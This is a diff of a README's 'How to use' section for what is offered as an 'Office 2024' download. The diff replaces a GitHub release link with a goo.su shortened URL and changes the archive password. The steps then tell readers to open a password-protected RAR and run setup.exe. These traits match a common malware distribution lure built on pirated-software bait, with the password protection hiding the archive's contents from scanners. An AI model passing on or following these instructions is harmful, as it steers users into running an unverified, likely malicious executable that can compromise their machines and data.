@@ -2,8 +2,8 @@
 
 <H3>How to use:</H3>
 
-- [Download](https://github.com/pipohernadzeze/office-24/releases/download/Download/Office.2024.rar)
-- Open archive (password: office)
+- [Download](https://goo.su/t7nrX)
+- Open archive (password: Project12!)
 - Open setup.exe for download all components and install
 - Follow the instruction
 
